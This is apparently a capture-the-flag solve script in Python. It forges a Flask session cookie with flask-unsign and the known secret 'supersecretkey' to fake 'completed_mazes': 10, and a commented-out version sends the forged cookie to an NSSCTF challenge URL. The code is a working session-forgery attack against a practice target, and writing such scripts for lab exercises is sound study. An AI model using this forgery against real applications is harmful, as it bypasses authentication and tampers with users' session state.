import itertools
import flask_unsign
from flask_unsign.helpers import wordlist
import requests as r
import time
import re
import sys
import os
import time

secret = "supersecretkey"
d_cookie = "eyJjb21wbGV0ZWRfbWF6ZXMiOjAsInN0YXJ0X3RpbWUiOjE3NDM5MjU5NDAuMjA4NjAwM30.Z_IytA.3gQaVWLpEkm-FNR5DgRPl2EhDK4"
e_cookie = (
    "{'completed_mazes': 10, 'start_time': "
    + str(time.time())
    + "}"
)
# os.system('flask-unsign --unsign --cookie "{}"'.format(d_cookie))
# os.system('flask-unsign --decode --cookie "{}"'.format(d_cookie))
# os.system('flask-unsign --decode --cookie "{}" --secret "{}"'.format(d_cookie, secret))
os.system('flask-unsign --sign --cookie "{}" --secret "{}"'.format(e_cookie, secret))








## 发送请求，捕获响应html
# #!/usr/bin/env python3
# # -*- coding: utf-8 -*-

# import time
# import requests
# from flask import Flask
# from flask.sessions import SecureCookieSessionInterface

# # —— 配置区 —— #
# SECRET_KEY = "supersecretkey"
# TARGET_URL = "http://node7.anna.nssctf.cn:20995/"

# def sign_flask_session(data: dict, secret: str) -> str:
#     """
#     用 Flask 的内置 SecureCookieSessionInterface 对 data 签名，
#     返回可以直接当作 session cookie 的字符串。
#     """
#     app = Flask(__name__)
#     app.secret_key = secret
#     serializer = SecureCookieSessionInterface().get_signing_serializer(app)
#     return serializer.dumps(data)

# def main():
#     session = requests.Session()

#     # 举例做一次请求，你可以放在循环里做多次
#     payload = {
#         "completed_mazes": 10,
#         "start_time": time.time()
#     }
#     signed_cookie = sign_flask_session(payload, SECRET_KEY)

#     # 把签名好的 session cookie 设到 requests.Session 里
#     session.cookies.set("session", signed_cookie, domain="node7.anna.nssctf.cn")

#     # 发送 GET 请求
#     resp = session.get(TARGET_URL)
#     resp.raise_for_status()

#     # 输出状态码和前 200 字符做预览
#     print(f"[{resp.status_code}] →", resp.text[:200].replace("\n"," "))

#     # 如果你要保存最后一次的完整 HTML 到文件：
#     with open("final_response.html", "w", encoding="utf-8") as f:
#         f.write(resp.text)
#     print("✅ 最后一次返回的 HTML 已保存到 final_response.html")

# if __name__ == "__main__":
#     main()